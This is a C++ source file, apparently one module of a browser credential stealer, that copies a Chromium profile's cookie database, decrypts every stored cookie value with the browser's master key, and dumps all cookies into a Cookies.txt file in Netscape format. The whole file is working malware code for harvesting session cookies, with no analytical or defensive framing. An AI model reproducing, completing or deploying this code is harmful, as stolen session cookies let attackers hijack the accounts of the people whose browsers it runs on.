//
// Created by .1qxz on 09.06.2024.
//

#include "CCookies.h"

void CCookies::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Network" / "Cookies";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Cookie> cookies = this->getCookies(copied_db);

    if(cookies.empty())
        return;

    std::stringstream ss;

    for(const Cookie &cookie : cookies)
    {
        ss << cookie.host_key;
        ss << "\tTRUE\t";
        ss << cookie.path;
        ss << "\tFALSE\t";
        ss << std::to_string(cookie.expires_utc);
        ss << "\t";
        ss << cookie.name;
        ss << "\t";
        ss << cookie.value;
        ss << "\r\n";
    }

    Utils::writeFile(root / "Cookies.txt", ss.str(), true);
}

std::list<Cookie> CCookies::getCookies(const fs::path &db_path) {
    std::list<Cookie> cookieList;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc FROM cookies";
//    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return {};
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* host_key = sqlite3_column_text(stmt, 0);
        const unsigned char* name = sqlite3_column_text(stmt, 1);
        const unsigned char* value = sqlite3_column_text(stmt, 2);
        const void* encrypted_value = sqlite3_column_blob(stmt, 3);
        int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
        const unsigned char* path = sqlite3_column_text(stmt, 4);
        long long expires_utc = sqlite3_column_int64(stmt, 5);

        Cookie cookieRecord;
        cookieRecord.host_key = std::string(reinterpret_cast<const char*>(host_key));
        cookieRecord.name = std::string(reinterpret_cast<const char*>(name));
        cookieRecord.path = std::string(reinterpret_cast<const char*>(path));
        cookieRecord.expires_utc = expires_utc;

        std::vector<BYTE> encoded_value;
        encoded_value.assign(static_cast<const unsigned char*>(encrypted_value), static_cast<const unsigned char*>(encrypted_value) + encrypted_value_size);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_value = ChromiumUtil::decryptData(encoded_value, master_key);

        cookieRecord.value = decoded_value;

        if(decoded_value.empty())
            cookieRecord.value = std::string(reinterpret_cast<const char*>(value));

        cookieList.push_back(cookieRecord);
    }

    if (rc != SQLITE_DONE) {
        std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return cookieList;
}
